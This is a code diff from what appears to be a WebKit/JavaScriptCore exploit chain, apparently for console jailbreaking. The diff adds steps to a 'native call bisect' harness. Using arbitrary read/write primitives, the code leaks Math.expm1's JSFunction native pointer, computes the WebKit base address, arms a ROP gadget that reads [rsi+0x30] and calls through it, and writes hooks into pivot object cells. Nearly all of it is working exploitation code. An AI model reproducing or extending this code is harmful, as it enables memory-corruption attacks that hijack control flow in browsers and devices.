@@ -62,20 +62,23 @@ import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke,
     layoutSmokeStack, layoutGetpidStack, bisectArmG0, bisectHookPivot, bisectHookPivotPoops,
-    bisectFireExpm1, bisectRestore, fireNativeCallBisect, verifyFullChainSet, describeSlabLayout,
-    patchPrepG5, verifySlabAddrs, CHAIN_POP_ROWS } from "./native_call.js";
+    bisectFireExpm1,     bisectRestore, fireNativeCallBisect, verifyFullChainSet, describeSlabLayout,
+    patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
+    CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830ac";
+const BUILD_ID = "rw-20250830ad";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
     { id: "prep", label: "N1 prep", title: "skip if PREP-PIN @ Start (?freshprep=1 to redo)" },
     { id: "layout-smoke", label: "N2 layout", title: "write smoke ROP stack (no JSC writes)" },
     { id: "arm-g0", label: "N3 arm G0", title: "write G0 → main m_function" },
-    { id: "hook", label: "N4 hook", title: "hook @ leakval+0x30 (13.52 G0 rsi+0x30)" },
-    { id: "hook-poops", label: "N4b hook0", title: "hook @ leakval+0 (poops 13.00 style)" },
-    { id: "expm1-lite", label: "N5a exp1", title: "expm1(1) G0 armed NO hook" },
+    { id: "peek-pivot", label: "N4p peek", title: "read pivotCell+0..0x40 (no writes)" },
+    { id: "hook", label: "N4 hook", title: "hook @ leakval+?hookoff (default +0)" },
+    { id: "hook-poops", label: "N4b +0", title: "hook @ leakval+0" },
+    { id: "hook-multi", label: "N4m multi", title: "hook @ +0 +20 +28 +30 +38 at once" },
+    { id: "expm1-lite", label: "N5a exp1", title: "expm1(1) G0 armed — OOM expected (no hook)" },
     { id: "expm1-nohook", label: "N5c obj", title: "expm1(pivotObj) G0 armed NO hook" },
     { id: "expm1", label: "N5 expm1", title: "expm1(pivotObj) after N4 hook" },
     { id: "expm1-g5alt", label: "N5b G5alt", title: "G5=expm1+0x53642a then expm1 (after N3+N4)" },
@@ -3575,12 +3578,8 @@ function resolveWebkitBase(off, nativeFn) {
 /** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
 function ensureNativePrep(p, off) {
     if (nativePrep) return nativePrep;
-    const cell = p.leakval(Math.expm1);
-    const jfn = p.read8(cell.add32(0x18));
-    const mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
-    const mainOrig = p.read8(mainMf);
-    const nativeFn = mainOrig;
-    if (!nativeFn) throw new Error("nativeFn capture failed");
+    const cap = captureMainMfForPrep(p, off);
+    const { mainMf, mainOrig, nativeFn, path, cell, jfn } = cap;
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
     const pivotObj = pivotObjForPrep(window._wkCarrier);
@@ -3589,8 +3588,11 @@ function ensureNativePrep(p, off) {
         mainMf, mainOrig, pivotObj, pivotCell,
     });
     nativePrep.keepAlive.push(pivotObj);
-    mark("NATIVE-PREP", "pivot=" + (params.get("pivot") === "obj" ? "{}" : "textarea")
-        + " cell=" + pivotCell);
+    nativePrep._cap = { path, cell, jfn };
+    mark("NATIVE-PREP", "mainMf " + path + " pivot="
+        + (params.get("pivot") === "ta" ? "textarea" : "{}")
+        + " cell=" + pivotCell + " G0code="
+        + gadgetBytesHex(p, webkitBase, off.wk_MOV_RDI_RSI_30_CALL, 8));
     pinNativeRetain();
     return nativePrep;
 }
@@ -3720,9 +3722,42 @@ function requireNativePrep() {
 }
 
 function pivotObjForPrep(carrier) {
-    if (params.get("pivot") === "obj") return {};
-    if (carrier && carrier.textarea) return carrier.textarea;
+    if (params.get("pivot") === "ta" && carrier && carrier.textarea)
+        return carrier.textarea;
     return {};
+}
+
+function codeLooksNative(code4) {
+    return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
+}
+
+/** cal-style — pick jfn+m_function offset where pointer looks like native code. */
+function captureMainMfForPrep(p, off) {
+    const mOff = off.wk_JSFunction_m_function || 0x28;
+    const cell = p.leakval(Math.expm1);
+    const jfn = read8p(p, cell.add32(0x18));
+    if (!jfn) throw new Error("no JSFunction @ expm1 cell+0x18");
+    const cands = [];
+    for (const o of [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10]) {
+        const fn = read8p(p, jfn.add32(o));
+        if (fn && fn.hi > 0) cands.push({ o, fn });
+    }
+    let pick = null;
+    for (let i = 0; i < cands.length; i++) {
+        if (codeLooksNative(read4p(p, cands[i].fn))) {
+            pick = cands[i];
+            break;
+        }
+    }
+    if (!pick && cands.length) pick = cands[0];
+    if (!pick) throw new Error("mainMf capture failed");
+    const mainMf = jfn.add32(pick.o);
+    const mainOrig = read8p(p, mainMf);
+    if (!mainOrig) throw new Error("mainOrig read failed");
+    return {
+        cell, jfn, mainMf, mainOrig, nativeFn: mainOrig,
+        path: "jfn+0x" + pick.o.toString(16),
+    };
 }
 
 /** Visible log + sessionStorage flush (survives N5 OOM on reload). */
@@ -3817,6 +3852,21 @@ function runNativeBisectStep(stepId) {
             bisectLog("BISECT-OK", "N3 armed G0 → mainMf");
             state("N3 arm G0 OK", "ok");
             break;
+        case "peek-pivot":
+            requireNativePrep();
+            try {
+                const rows = probePivotCell(p, nativePrep.pivotCell);
+                for (let i = 0; i < rows.length; i++) {
+                    const r = rows[i];
+                    bisectLog("PIVOT-PEEK", "+0x" + r.off.toString(16) + "=" + r.val);
+                }
+                bisectLog("BISECT-OK", "N4p peek pivotCell=" + nativePrep.pivotCell
+                    + " (G0 reads [rsi+0x30] — hook must poison THAT slot)");
+            } catch (peekErr) {
+                bisectLog("BISECT-FAIL", "N4p " + (peekErr.message || peekErr));
+            }
+            state("N4p peek OK", "ok");
+            break;
         case "hook":
             requireNativePrep();
             bisectHookPivot(p, nativePrep, off);
@@ -3838,18 +3888,25 @@ function runNativeBisectStep(stepId) {
             break;
         case "hook-poops":
             requireNativePrep();
-            bisectHookPivotPoops(p, nativePrep);
+            bisectHookPivotAt(p, nativePrep, 0);
             bisectSnapshot(p, nativePrep, off, "post-N4b");
             bisectLog("BISECT-OK", "N4b hook @ leakval+0 → S=" + nativePrep.M.S);
             state("N4b hook0 OK", "ok");
+            break;
+        case "hook-multi":
+            requireNativePrep();
+            bisectHookPivotMulti(p, nativePrep, [0x0, 0x20, 0x28, 0x30, 0x38]);
+            bisectSnapshot(p, nativePrep, off, "post-N4m");
+            bisectLog("BISECT-OK", "N4m multi-hook +0 +20 +28 +30 +38 → S=" + nativePrep.M.S);
+            state("N4m multi OK", "ok");
             break;
         case "expm1-lite":
             requireNativePrep();
             if (!nativePrep.mainArmed) bisectArmG0(p, nativePrep);
             bisectSnapshot(p, nativePrep, off, "pre-N5a");
-            bisectLog("BISECT-WARN", "N5a Math.expm1(1) — G0 armed, NO hook");
+            bisectLog("BISECT-WARN", "N5a expm1(1) — OOM EXPECTED (G0 runs, [rsi+0x30] unpoisoned)");
             Math.expm1(1);
-            bisectLog("BISECT-OK", "N5a expm1(1) survived");
+            bisectLog("BISECT-OK", "N5a expm1(1) survived (unexpected — G0 may not have run)");
             state("N5a OK", "ok");
             break;
         case "expm1-nohook":
